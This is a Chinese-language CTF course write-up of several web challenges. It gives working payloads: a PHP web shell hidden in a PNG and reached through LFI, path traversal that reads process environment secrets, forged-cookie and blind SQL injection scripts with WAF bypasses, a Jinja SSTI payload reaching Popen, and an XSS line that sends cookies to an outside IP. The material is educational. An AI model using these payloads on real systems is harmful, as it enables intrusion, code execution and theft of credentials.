# 0x02 Web Writeup

## Homework - Imgura [100]

- 題目網址：[https://imgura.chal.h4ck3r.quest/](https://imgura.chal.h4ck3r.quest/)
- 助教給的提示：`Information Leak`、`Upload`、`LFI` (老實說提示的滿兇的XD)
- Imgura 資料夾中的項目：
  - `leak_src.zip`：透過 `.git` 還原出的原始檔
  - `prev_commit_src`：還原上一個 Commit 的 Source Code
  - `Retro9IsMe.png.php`：攻擊 Payload
  - `Retro9IsMe.png`：偽裝圖片

看到提示其實就可以猜到幾個 Information Leak 的方向，有幾種可能如 Error 的 Debug 資訊沒關、robots.txt 裡或 source code 裡有些 Route 沒拿掉或沒辦法拿掉等等。但這題的 Information Leak 肇因於部署時是直接透過 git pull 後在專案根目錄直接起一個 Http Server，讓攻擊者可以存取 `.git` 資料夾還原出完整的 Source Code

![Imgura git config](./resources/Screen%20Shot%202021-10-28%20at%204.09.23%20PM.png)

透過 [Scrabble](https://github.com/denny0223/scrabble) 去還原後就可以得到整個網頁的原始碼。從 `git log` 中可以看到這個 Repo 最近的 commit 把 Dev Page 刪除了：

![Git src log](./resources/Screen%20Shot%202021-10-28%20at%204.14.37%20PM.png)

我們只要透過指令 `git reset HEAD^ --hard` 回到 First commit，就可以得到所有 Dev 的程式碼了。

從這些程式碼中可以看到，這個頁面「曾經」有一個 dev_test_page 的存在，裏面有 Upload 功能以及 Share Image 的功能。為什麼是說「曾經」呢？理論上這些檔案本不應該存在在根目錄了，但實際上切到 `https://imgura.chal.h4ck3r.quest/dev_test_page/?page=pages/share` 路徑上仍可以看到舊的頁面，這邊真的滿奇怪的，也許是題目故意設計的吧。

![Imgura dev src page](./resources/Screen%20Shot%202021-10-28%20at%204.22.26%20PM.png)

總之分析過程式碼後可以得到兩個漏洞，分別是**上傳 Filter 實作上的缺陷**以及**HomePage 時做切換頁面的方法導致的 LFI 漏洞**。

Filter 功能的漏洞如下：

```php
# 這裏居然預設是取第二個 Split 元素，直接預設整個檔名中只會有一個 dot
# bypass 的方法只要在檔名中多加一個 .png 或其他可接受的 extension 就可了
$extension = strtolower(explode(".", $filename)[1]);

if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false) {
    die("Invalid file extension: $extension.");
}

# 這個 check 方法會 Check 檔案的第一個 File，假設今天這個檔案是由兩種不同的檔案接在一起的話，就可以 Bypass 掉這條限制
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$type = finfo_file($finfo, $_FILES['image_file']['tmp_name']);
finfo_close($finfo);
if (!in_array($type, ['image/png', 'image/jpeg'])) {
    die('Not an valid image.');
}

# 濾掉 <?php ....
# 這個就有一堆 Bypass 方法了，黑名單永遠是最不好的方法
$content = file_get_contents($_FILES['image_file']['tmp_name']);
if (stripos($content, "<?php") !== false) {
    die("Hacker?");
}
```

其他限制就滿簡單的如檔案大小、width、height 等等就滿簡單可以 Bypass 掉。

第二個漏洞來自於 index page 實作 router 的方法導致的 LFI:

```html
<div class="hero-body">
  <?php
  include ($_GET['page'] ?? 'pages/main') . ".php";
  ?>
</div>
```

所以最終的攻擊手法：

1. 在一個 legit 的 png (`Retro9IsMe.png`) 檔後新增一小段 php script (`<?=system($_GET["cmd"]);?>`)
2. 改檔名成 `Retro9IsMe.png.php`
3. 把檔案透過上傳功能上傳到伺服器
4. 把首頁 `page` query 改成檔案位置，並加上 cmd query 執行 Commmad
5. Navigator 後找到 Flag 檔案

## Homework - Screensaver [200]

題目提供的資料：

- DVD-Screensaver
  - `app`: 伺服器原始碼
  - `db.sql`: 部分資料庫初始化 sql script
  - `docker-compose.yml`: Docker Compose 部署 yml 檔
  - `Dockerfile`: 伺服器 Image Dockerfile

解題時用到的程式碼 or 指令

- DVD-Screensaver
  - `signCookie`: 取得 Secret Key 後自行簽 Cookie 的程式碼
  - `automation.py`: 自動執行 Sqli 的 python script
  - `challenge_server_env.txt`: 目標伺服器中的 `/proc/1/environ`
  - `curl-script.sh`: 測試 Idea 可不可行時使用到的 `curl` 指令
  - `secretKey.txt`: 簽 Cookie 使用到的密鑰
  - `sqli_payload.txt`: sql injection 使用到的 payload

### Recon

先來個 Happy Walk 後，這個網頁基本上就只是一個擬螢幕保護程式，用 Guest 登入後會有個 u don't have flag 在螢幕上跑來跑去：

![you don't have flag](./resources/Screen%20Shot%202021-10-28%20at%209.14.52%20PM.png)

整個 Web App 看起來唯一使用者可以控制的 Input 就只有在登入頁面了，而登入後的頁面則是吃 Cookie 的值來驗證使用者是誰。

接下來來看 Source Code。Server 的部署方式是使用 Docker Compose 來達成，除了 Public Web Server 以外後端有一台 Mysql 伺服器負責儲存使用者的帳號密碼，而 mysql 本身的伺服器帳號密碼是寫死在 source code 裡的，但看起來這題沒有機會達成 SSRF 的路徑，有帳號密碼也沒用。

這個 Web App 主要功能是產生一組**由使用者控制的 username，以及一個 Environment Variable 中的 Secret Key**，產生cookie 後回傳給前端完成使用者認證，前端頁面則會根據這個 **username** 使用者在 DB 中的 row entry 中有沒有 Flag 這個欄位，有的話則會顯示使用者的 Flag，沒有則是顯示 `You don't have flag`。

當然在沒有使用 ORM 的狀況下，程式碼中有兩個看起來有機會達成 Sqli 的漏洞。第一個看起來使用者可控，但 Inject 的內容是來自於 Cookie，所以我們需要進一步的資料。

```go
// 產生 Cookie 的地方
session, _ := store.Get(r, "session")
session.Values["username"] = username
err = session.Save(r, w)
if err != nil {
    log.Println(err)
    http.Error(w, err.Error(), http.StatusInternalServerError)
    return
}
http.Redirect(w, r, "/", http.StatusFound)
```

```go
http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
    session, _ := store.Get(r, "session")

    username := session.Values["username"]
    if session.Values["username"] == nil {
      http.Redirect(w, r, "/login", http.StatusFound)
      return
    }

    query := fmt.Sprintf("SELECT username, flag FROM users WHERE username='%s'", username)
    row := db.QueryRow(query)
    var user User
    row.Scan(&user.Username, &user.Flag)

    templates.ExecuteTemplate(w, "index.html", user)
})
```

程式碼中的另一個 Sqli 的弱點似乎可行，但因為前面是使用白名單的方式只讓 `^[0-9a-zA-Z]+$` 這些字元輸入，所以從這裡執行 Sqli 是做不到的。

```go
var IsLetter = regexp.MustCompile(`^[0-9a-zA-Z]+$`).MatchString
// ....
if !IsLetter(r.FormValue("username")) || !IsLetter(r.FormValue("password")) {
    log.Println("!IsLetter")
    w.Write([]byte("Incorrect username or password"))
    return
}

var username string
var password string
query := fmt.Sprintf(
    "SELECT username, password FROM users WHERE username='%s' and password='%s'",
    r.FormValue("username"), r.FormValue("password"))
log.Println(query)
err := db.QueryRow(query).Scan(&username, &password)
// ....
```

Source Code 中另一個 Vulnerability 是有關 Path Traversal 類型的漏洞：

```go
http.HandleFunc("/static/", func(w http.ResponseWriter, r *http.Request) {
    filename := strings.TrimPrefix(r.URL.Path, "/static/")
    content, err := os.ReadFile(filepath.Join("./static/", filename))
    if err != nil {
      http.Error(w, "404 Not found", http.StatusNotFound)
      return
    }
    w.Header().Add("Content-Type", mime.TypeByExtension(filepath.Ext(filename)))
    w.Write([]byte(content))
})
```

在一般狀況下，Golang 的 router ([net/http - ServeMux](https://pkg.go.dev/net/http#ServeMux)) 會自動幫你把 Path 縮短成最簡路徑，理論上不可能會有 Path Traversal 的問題：

> ServeMux also takes care of sanitizing the URL request path and the Host header, stripping the port number and redirecting any request containing . or .. elements or repeated slashes to an equivalent, cleaner URL.

但在接下來的段落中明確提到，`CONNECT` 這個 Http Method 會有例外行為：

> The path and host are used unchanged for CONNECT requests.

這個原本是用來 Tunneling 或是 Proxy Server 達到 SSL 的方法([Wiki](https://en.wikipedia.org/wiki/HTTP_tunnel))，在這裡卻可以完美誤用，以達成 Path Traversal 的目的。

所以綜合以上幾個 Recon，我們的 Attack Path 就成形了：

1. 透過 Path Traversal 讀取 `/proc/1/environ` 取得 Sign Cookie 的 `SECRET_KEY`
2. 使用得到的 `SECRET_KEY` 自行簽任意 username 值的 cookie，把 sqli 的 payload 放進去
3. 夾帶 cookie 傳送到 `/` 後，從 `<div class="neon">Hi, {{ .Username.String }} </div>` 取得整個 users 中每個使用者的 Flag

### Pwn

第一步取得 ENV 其實滿簡單的，透過 Curl 就可以輕鬆取得：

```zsh
curl -X CONNECT --path-as-is http://dvd.chal.h4ck3r.quest:10001/static/../../proc/1/environ --output challenge_server_env
```

第二步，利用取得的 `SECRET_KEY=d2908c1de1cd896d90f09df7df67e1d4` 自行簽章包含 Sql 語法的 Cookie (因為一開始還在測試階段，我把簽章程式寫成 Server 模式方便試驗成果以及接下來的 Automation 整合)：

```go
store := sessions.NewCookieStore([]byte("d2908c1de1cd896d90f09df7df67e1d4"))

http.HandleFunc("/get", func(w http.ResponseWriter, r *http.Request) {
   payload := r.URL.Query()["username"][0]
   fmt.Println(payload)

   session, _ := store.Get(r, "session")
   session.Values["username"] = payload
   session.Save(r, w)
})
```

最終使用的 Sql Payload：

```sql
-- 後面多加 uid > 70 是因為 group_concat 有字數限制，Flag 又在很後面所以需要加個 offset 才部會印不出來
gudsfasa' UNION SELECT GROUP_CONCAT(flag SEPARATOR ','), NULL FROM users WHERE uid > 70 and ''='
```

第三部把攻擊過程寫成一個 Automation 的 Script，得到最終的 Flag

```python
from requests import get
from sys import argv
from bs4 import BeautifulSoup

# Sign Cookie Url
url = "http://localhost:8888/"
ctf_site = "http://dvd.chal.h4ck3r.quest:10001/"

injection = argv[1].replace(" ", "/**/")

# Generate Cookie
response = get(url+f"get?username={injection}")
generate_cookie = response.cookies["session"]

# Test Result
res = get(ctf_site, cookies={"session": generate_cookie})

soup = BeautifulSoup(res.text, 'html.parser')
datadump = soup.select_one("body>h1").text[4:].split(",")

for d in datadump:
    print(d)
```

執行結果：

![Final Result](./resources/Screen%20Shot%202021-10-28%20at%2010.19.56%20PM.png)

## Homework - Double SSTI

Hints:

- SSTI

資料夾裡的東西：

- `index.js`: 測試 Handlebars 使用的程式碼
- `solve.py`: 解題用 Script

### Recon

一開始點進去頁面長這樣：

![DOUBLE SSTI Landing page](../0x02-Web/resources/Screen%20Shot%202021-11-22%20at%205.57.36%20PM.png)

理論上如果是完全 Blackbox test 的話應該要去丟不同種類的 SSTI Payload 去測試此服務是用什麼東西實做的。但打開 F12 後看到原始碼中有一行註解，提示這題可以從 `/source` 看到程式碼，所以我們就可以看到到底是用什麼 Library 實作 Rendering 的功能了：

```js
const { response } = require('express');
const express = require('express');
const handlebars = require('handlebars');
const { createProxyMiddleware } = require('http-proxy-middleware');
const { secret } = require('./secret.js');

const app = express();

// Proxy endpoints
// Try to figure out the path!
app.use(`/2nd_stage_${secret}`, createProxyMiddleware({
    target: "http://jinja",
    changeOrigin: true,
    pathRewrite: {
        [`^/2nd_stage_${secret}`]: '',
    },
}));

app.get("/source", (_, response) => {
    response.sendFile(__filename);
});

app.get('/', (_, response) => {
    response.sendFile(__dirname + "/index.html");
});

app.get("/welcome", (request, response) => {
    const name = request.query.name ?? 'Guest';
    if (name.includes('secret')) {
        response.send("Hacker!");
        return;
    }
    const template = handlebars.compile(`<h1>Hello ${name}! SSTI me plz.</h1>`);
    response.send(template({ name, secret }));
})


app.listen(3000, '0.0.0.0');
```

Recon 的順序如下：

- 這是一個用 Express 寫成的後端服務
- 第一個 SSTI Point 在 `/welcome` 這支 route 上，使用的是 [Handlebarjs](https://handlebarsjs.com/) 這個 npm 的 package
- 第二個 point 需要透過第一個 SSTI Point 取得 secret 值以取得 Second Stage 的路徑
- 第二個 SSTI Point 是連到內網的一個 Domain，實作細節並不知道，但可以知道他是用 Jinja 實作的

有了這些資訊後就可以開始解題啦

### Pwn

第一關的 Handlebar SSTI 其實滿簡單的，也不要求 RCE，從 Source Code 中可以看到 Secret 其實在 [Context](https://handlebarsjs.com/guide/#evaluation-context) 中就可以取得。詳細看了一下 Handlebar 的 Document 後可以找到一個叫 `@key` 的 [@Data variable](https://handlebarsjs.com/api-reference/data-variables.html) 可以得到物件的 Key Name，以及 `#each` 這個 [builtin helper](https://handlebarsjs.com/guide/builtin-helpers.html#each)，我們就可以取得 secret 得到 second stage 的 ssti url 囉。

```txt
{{#each this}}
  Key: {{@key}} -> {{this}}
{{/each}}
```

接下來的 SSTI 是用 Jinja 實作的，簡單的輸入 `"".__class__` 就可以發現被擋掉了。簡單的了測試了幾個 Payload，整理出關於這個 Waf 的 Filtering 規則如下：

被 Filter 掉的東西：

- `.`
- `[]`
- `__`

沒有被 Filter 掉的東西：

- `request`, `args`
- `attr`, `join`, `last`
- `if`, `for`, `in`
- `()`
- `_`  -->> lol

剛開始有想過用 query 去塞，但 attr 似乎沒辦法用在 param 上，需要去研究一下實作 Detail。總之找到 Filter 規則後就可以用各種各樣的 Bypass 方法啦！

- 因為只有擋連在一起的 `_`，所以只要使用 `join` builtin-filter 就可以把 `__class__`, `__mro__`, `__subclasses__` 等特殊字元組出來
- 有擋 `[]` 代表沒辦法使用 index，但 `for` 迴圈和 `if` statement 並沒有被擋，所以我們就可以透過判斷是找到 `Popen`，執行我們的 Payload

所以最終 Payload 如下：

```txt
{% for item in ((((""|attr((("_", "_", "class", "_", "_")|join)))|attr((("_", "_", "mro", "_", "_")|join)))|last)|attr((("_", "_", "subclasses", "_", "_")|join)))() %}
    {{ item("cat /y000_i_am_za_fl4g", shell=True, stdout=-1)|attr("communicate")() if item|attr((("_", "_", "name", "_", "_")|join)) == "Popen"}}
{% endfor %}
```

## Homework - Log me in Final

- `check.py`: 解題使用到的 Payload，主要是 Blind SQLi 的 Script

### Recon

預設一下這個後端驗證服務的寫法，大概就是根據輸入的 credential 去 DB 中撈資料後，如果有撈到就代表登入成功，沒的話就代表登入失敗。大概的實作會長這樣：

```sql
select * from users where username="username" and password="password";
```

先試一組 happy walk，用 guest, guest 可以知道登入成功後會吐出 `Welcome!`, 失敗則會得到 `Incorrect username or password.`。

簡單是幾個 SQLi 的 payload `\'`, `\\'` 後，發現第二個輸入會觸發 500 error 頁面，可以得知後面用的是 Mysql，以及這段程式碼的實作方式：

```ruby
```

接著先來測試一下 `sqli_waf` 的 Filtering 機制，以及 `addslashes` 的實作 detail。

`addslashes`:

- `\'` → `\\'`
- `\\\'` → `\\\\'` (他的 Addslash 是針對 `'` 而已)
- No String Allowed

`sqli_waf`:

- Filtered Keyword:
  - `\' Union Select` → `\\'`
  - `\' Uni/**/on Se/**/lect` → `\\'Un/**/ionSe/**/lect'`
    - Space will be removed
    - adding comment will break the keywords filter
  - `\'UniunionOn` → Failed, all being striped out (Recursively apply filter I think)
  - 🎉🎉 Gotcha !! `\'SEUNIONLECT` → `\'SELECT` !!! So the actual backend filtering mechanism is recursively scanning query **AGAINST SINGLE KEYWORD** !!
    - Scanning Sequence: `IS` → `SELECT` → `AND` → `OR`  → `WHERE` → `=` → `UNION` →
    - Keyword that didn't filter out: `NULL` , `FROM` , `CREATE` , `TABLE` , `GROUP` , `BY` , `IF` , `()` , `count` , `as` , `substr` , `ascii` ,

其他事項：

- `;#` As Comment
- Try to Inject Payload at Password

### Pwn

Blind SQLi 有幾個目標：

- 確認 Server 裡有幾個 Schema，以及每個 Schema 的名稱
- 確認目標 Schema 中有哪些 Table
- 確認目標 Table 中 Column 的結構
- Dump 出目標資料

這次因為當作練習，所以所有 Script 都用手寫。先看 `send_request` 的實作：

```python
# Bypass WAF Keyword Filter
sk = {
    "select": "SELandECT",
    "order": "OwhereRDER",
    "or": "OwhereR",
    " ": "/**/"
}

# Blind SQL Let's GOOOOO!
TRUE_CONDITION = "Welcome!"
FALSE_CONDITION = "Incorrect username or password."

def send_request(sql:str):
    # Preprocessing
    sql = sql.lower()
    logging.debug(sql)
    for key in sk:
        sql = sql.replace(key, sk[key])

    payload = {
        "username": f"\\'{sql};#",
        "password": ""
    }

    logging.debug(f"Sending Sql Payload of: {payload['username']}")

    response = post("https://sqli.chal.h4ck3r.quest/login", data=payload)
    if response.status_code == 500:
        logging.error("Something Went Wrong with Ur Payload!!")
        exit(1)
        return ""

    logging.debug(f"Got Response: {response.text}")
    return response.text
```

主要會根據前一步驟 Recon 得到的資訊，把 SQLi payload 中會被 filter keyword 都修改成對的格式以躲掉 `sqli_waf`。還有其他一些 Helper Function 如 `check_len` (用來確認目標字串長度), `check_ascii` (確認目標字串中的 ascii 值), `incrementalSearch`, `binarySearch` 等搜索方法，加速 Dump 資料的時間。

```python
# UTIL Function - Check String Length
def check_len(length, target_sql):

    sql = f" or if (({target_sql}) > {length}, 1, 0)"
    res = send_request(sql)

    return TRUE_CONDITION in res

# Target_sql -> Prepare Target String Column
def check_ascii(target_ascii, target_sql, column_name, row_offset=0, character_offset=1):
    
    sql = f" or if ((select ASCII(SUBSTR({column_name}, {character_offset}, 1)) from ({target_sql}) as tabless limit {row_offset}, 1) > {target_ascii}, 1, 0)"
    res = send_request(sql)

    return TRUE_CONDITION in res

# Search Method
def binarySearch(checker, start, end, *argv):
    cur = int((start+end) / 2)

    while True:
        if checker(cur, *argv):
            start = cur+1
        else:
            end = cur

        if end-start == 1 or end == start:
            break

        cur = int((start+end) / 2)
        
    if end == start:
        return start
    elif end-start == 1:
        # Double Check
        flag = checker(start, *argv)

        if flag:
            return end
        else:
            return start
    else:
        logging.error("Something Went Wrong In Binary Search!!")


def incrementalSearch(checker, start, *argv):
    while True:
        if checker(start, *argv):
            start += 1
        else:
            break
    return start
```

取得所有 Schema 的名稱：

```python
# DB 中有 5 個 Schema
# ['db', 'sys', 'mysql', 'information_schema', 'performance_schema']
def get_db_names(db_count):
    names = []
    for i in range(db_count):
        name = ""
        length = incrementalSearch(check_len, 0, f"select length(table_schema) from information_schema.tables group by table_schema order by length(table_schema) limit {i}, 1")
        logging.info(f"{i}th DB name has length: {length}")

        for j in range(length):
            name += chr(binarySearch(check_ascii, 33, 126, f"select table_schema from information_schema.tables group by table_schema order by length(table_schema)", "table_schema", i, j+1))
            logging.info(f"Found {j}th character: {name[j]}")

        logging.info(f"Append: {name}")
        names.append(name)
    
    return names
```

到這一步可以確認使用者創建的資料都在 `DB` 這個 schema 中，接著我們就可以 dump 出該 schema 中有哪些 table：

```python
# 得到 [h3y_here_15_the_flag_y0u_w4nt,meow,flag,users]
def get_all_table_name_in_db(index=0):
    result = ""

    length = incrementalSearch(check_len, 0, f"select length(GROUP_CONCAT( distinct table_name)) from information_schema.columns group by table_schema order by table_schema limit {index}, 1")
    logging.info(f"Table Name of {index} name has length: {length}")

    for i in range(length):
        result += chr(binarySearch(check_ascii, 33, 126, f"select GROUP_CONCAT( distinct table_name) as tc from information_schema.columns group by table_schema order by table_schema limit {index}, 1", "tc", 0, i+1))
        logging.info(f"Found {i}th character: {result[i]}")

    return result
```

這裡有個小陷阱，因為 `group_concat` 在不能指定 `seperator` 的狀況下預設是 `,`，而助教在這邊又把 table name 加了 `,` 進去，讓人沒有辦法快速找到正確的 table name QQ

總之，我們可以確認我們的資料在 `h3y_here_15_the_flag_y0u_w4nt,meow,flag` 這個 table 裡，所以下一步就是要去確認一下 Column Name 長怎樣：

```python
# 得到 i_4m_th3_fl4g,password,uid,username
def get_all_column_in_table(index=0):
    result = ""

    length = incrementalSearch(check_len, 0, f"select length(group_concat(column_name)) from information_schema.columns group by table_schema order by length(table_schema) limit {index}, 1")
    logging.info(f"Column Concat Length: {length}")

    for i in range(length):
        result += chr(binarySearch(check_ascii, 33, 126, f"select group_concat(column_name) as tc from information_schema.columns group by table_schema order by length(table_schema) limit {index}, 1", "tc", 0, i+1))
        logging.info(f"Found {i}th character: {result[i]}")

    return result
```

大功告成！接下來只要把資料偷出來就行了：

```python
# 取得 FLAG{!!!b00lean_bas3d_OR_err0r_based_sqli???}
def get_all_content_in_rows():
    result = ""

    length = incrementalSearch(check_len, 0, f"select length(group_concat(i_4m_th3_fl4g)) from `h3y_here_15_the_flag_y0u_w4nt,meow,flag`")
    logging.info(f"flag!!! length: {length}")

    for i in range(length):
        result += chr(binarySearch(check_ascii, 33, 126, f"select group_concat(i_4m_th3_fl4g) as tc from `h3y_here_15_the_flag_y0u_w4nt,meow,flag`", "tc", 0, i+1))
        logging.info(f"Found {i}th character: {result[i]}")

    return result
```

## Homework - Profile Card (Not Solved, only recon & thought)

### Brief Tested

- Login: user / password → SQL Injection Not work
- Login: user / password → Login Incorrect, Have Session → map → User Profile (Which DB ?)

### Currently Known Vulnerablities

- Bio is Vuln to Xss
  - Filter out `<script>` to `<bad>`
- CSP:

```txt
  default-src 'none';
  base-uri 'none';
  connect-src 'self'; 
  img-src http: https:;
  style-src 'self';
  script-src 'self'
```

- By Google CSP Checker, The only weak point of app's csp rule is by uploading a xss file to the server and pwn the victim
- No Inline Script Execution, only self
- Img http, https is Ok to Exfiltrate out-of-band data

## Some Payload

Work XSS Payload, blocked by csp policy

```html
<img src="dsa" onerror="console.log('HEllo')">
```

## Attack Path (Assume)

Write a Self Hosted Website

→ Use `[https://profile.chal.h4ck3r.quest/api/update](https://profile.chal.h4ck3r.quest/api/update)` to form csrf with json

[Application Security Assessment for CSRF | DirectDefense](https://www.directdefense.com/csrf-in-the-age-of-json/)

→ Change Admin's Bio to XSS Payload (???)

→ img exfiltration

```html
<img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">
```

Two Option:

- Img Exfiltration? I think it's not ok
- File Upload ? Content-Disposition....

[https://profile.chal.h4ck3r.quest/static/](https://profile.chal.h4ck3r.quest/static/) → NGINX? 這可能是某個上傳功能的開端？不是 單純他放東西的地方....

![Screen Shot 2021-11-18 at 9.50.32 AM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2b5a12a9-0871-4f41-9e9c-87f50e24d307/Screen_Shot_2021-11-18_at_9.50.32_AM.png)

/r/n ????
